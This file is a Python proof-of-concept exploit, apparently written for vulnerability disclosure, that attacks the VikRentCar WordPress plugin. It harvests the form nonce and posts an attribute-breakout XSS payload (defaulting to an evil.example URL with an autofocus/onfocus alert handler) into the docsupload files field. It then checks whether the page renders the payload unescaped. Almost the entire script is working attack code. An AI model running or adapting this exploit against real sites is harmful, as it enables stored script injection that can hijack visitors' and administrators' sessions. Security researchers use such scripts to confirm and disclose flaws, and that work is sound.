#!/usr/bin/env python3
"""
PoC Stored XSS via docsupload[files] -> <a href> (no esc_url).

Usage:
    python3 poc.py --url="http://target/rent/?option=com_vikrentcar&view=docsupload&sid=SID&ts=TS"

The --url must be the docsupload page URL of a CONFIRMED order you own
(sid + ts are printed on the order page / confirmation email).
The script fetches vikwp_nonce, stores an attribute-breakout payload,
then re-fetches the page to verify unescaped execution context.

Payload has no < > so it survives sanitize_text_field().
"""
import argparse
import re
import sys
import urllib.parse as urlparse

try:
    import requests
except ImportError:
    print("[-] missing dependency: pip install requests")
    sys.exit(2)

DEFAULT_PAYLOAD = 'http://evil.example/" autofocus onfocus="alert(document.domain)" x="'

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Wordfence-PoC)",
}


def extract_hidden(html, name):
    m = re.search(
        r'<input[^>]+name=["\']' + re.escape(name) + r'["\'][^>]*value=["\']([^"\']*)["\']',
        html, re.I,
    )
    if m:
        return m.group(1)
    m = re.search(
        r'<input[^>]+value=["\']([^"\']*)["\'][^>]*name=["\']' + re.escape(name) + r'["\']',
        html, re.I,
    )
    return m.group(1) if m else None


def extract_nonce(html):
    # JSession token name in this plugin is vikwp_nonce (see session.php)
    for pat in [
        r'name=["\']vikwp_nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'value=["\']([^"\']+)["\'][^>]*name=["\']vikwp_nonce["\']',
    ]:
        m = re.search(pat, html, re.I)
        if m:
            return "vikwp_nonce", m.group(1)
    return None, None


def extract_form_action(html):
    m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
    return m.group(1) if m else None


def main():
    ap = argparse.ArgumentParser(description="VikRentCar docsupload Stored XSS PoC")
    ap.add_argument("--url", required=True, help="docsupload page URL with sid & ts")
    ap.add_argument("--payload", default=DEFAULT_PAYLOAD, help="XSS payload (must start with http)")
    ap.add_argument("--timeout", type=int, default=20)
    args = ap.parse_args()

    if not args.payload.startswith("http"):
        print("[-] payload must start with http to pass strpos($file,'http')===0 check")
        sys.exit(2)

    s = requests.Session()
    s.headers.update(HEADERS)

    print(f"[*] GET {args.url}")
    r = s.get(args.url, timeout=args.timeout)
    if r.status_code != 200:
        print(f"[-] GET failed: {r.status_code}")
        sys.exit(1)
    html = r.text

    # sid / ts from URL or hidden inputs
    q = dict(urlparse.parse_qsl(urlparse.urlparse(args.url).query))
    sid = q.get("sid") or extract_hidden(html, "sid")
    ts = q.get("ts") or extract_hidden(html, "ts")
    itemid = q.get("Itemid") or extract_hidden(html, "Itemid") or ""
    if not sid or not ts:
        print("[-] could not find sid/ts in --url or page. Pass full docsupload URL.")
        sys.exit(1)
    print(f"[*] sid={sid} ts={ts} Itemid={itemid}")

    nonce_name, nonce_val = extract_nonce(html)
    if not nonce_val:
        print("[-] vikwp_nonce not found. Is docsupload enabled and order confirmed?")
        sys.exit(1)
    print(f"[*] nonce {nonce_name}={nonce_val[:12]}...")

    form_action = extract_form_action(html)
    if form_action:
        post_url = urlparse.urljoin(args.url, form_action.replace("&amp;", "&"))
    else:
        post_url = args.url.split("?")[0]
    # WordPress endpoint uses admin-post.php?action=vikrentcar when form posts there
    data = {
        "option": "com_vikrentcar",
        "task": "storedocsupload",
        "sid": sid,
        "ts": ts,
        "Itemid": itemid,
        "docsupload[files]": args.payload,
        "docsupload[comments]": "poc",
        "docsuploadsubmit": "1",
        nonce_name: nonce_val,
    }
    if "admin-post.php" in post_url:
        data["action"] = "vikrentcar"

    print(f"[*] POST {post_url} task=storedocsupload")
    r2 = s.post(post_url, data=data, timeout=args.timeout, allow_redirects=True)
    print(f"[*] POST status {r2.status_code} len={len(r2.text)}")

    print("[*] re-GET docsupload page to verify storage")
    # --url may point to the order page (/your-order-details/?sid=..&ts=..).
    # The payload only renders on the docsupload view, so resolve it first.
    verify_url = args.url
    if "view=docsupload" not in verify_url:
        m = re.search(r'href="([^"]*view=docsupload[^"]*)"', html, re.I)
        if m:
            verify_url = urlparse.urljoin(args.url, m.group(1).replace("&amp;", "&"))
            print(f"[*] discovered docsupload URL: {verify_url}")
        else:
            # pretty-permalink fallback: append view=docsupload to same page
            sep = "&" if "?" in verify_url else "?"
            verify_url = verify_url + sep + "view=docsupload&sid=" + sid + "&ts=" + ts
            print(f"[*] fallback docsupload URL: {verify_url}")
    r3 = s.get(verify_url, timeout=args.timeout)
    body = r3.text

    # Vulnerable if raw payload breaks out of href="..." (no esc_url)
    # e.g. <a href="http://evil.example/" autofocus onfocus="alert(document.domain)" ...
    # NOTE: the hidden input re-renders escaped (&quot;) via $this->escape() — that is
    # expected even when vulnerable. Only the <a href> / <span> sink matters.
    sink_pat = re.search(
        r'<a\s+href="' + re.escape(args.payload.split('"')[0]) + r'"\s+autofocus\s+onfocus=',
        body,
    )
    if sink_pat or ('<a href="http://evil.example/" autofocus' in body and 'onfocus=' in body):
        print("[VULNERABLE] payload stored and reflected unescaped in <a href>")
        # show snippet
        idx = body.find("evil.example", body.find("vrc-docsupload-file-uploaded"))
        if idx < 0:
            idx = body.find("evil.example")
        print("--- snippet ---")
        print(body[max(0, idx-160):idx+160].replace("\n", " ")[:400])
        print("---------------")
        return 0
    # also detect escaped (fixed) case: sink renders &quot; instead of breaking out
    if "evil.example" in body and "&quot;" in body and "autofocus" not in body.split("evil.example", 1)[-1][:500]:
        print("[NOT VULNERABLE] payload appears escaped (fixed).")
    elif "evil.example" in body:
        # payload present but ambiguous context — dump sink area for manual review
        print("[NEEDS REVIEW] payload found but breakout pattern not matched; check snippet")
        idx = body.find("evil.example")
        print("--- snippet ---")
        print(body[max(0, idx-300):idx+300].replace("\n", " ")[:700])
        print("---------------")
        return 1
    else:
        print("[NOT VULNERABLE] payload not found. Check sid/ts status=confirmed and docsupload=1.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
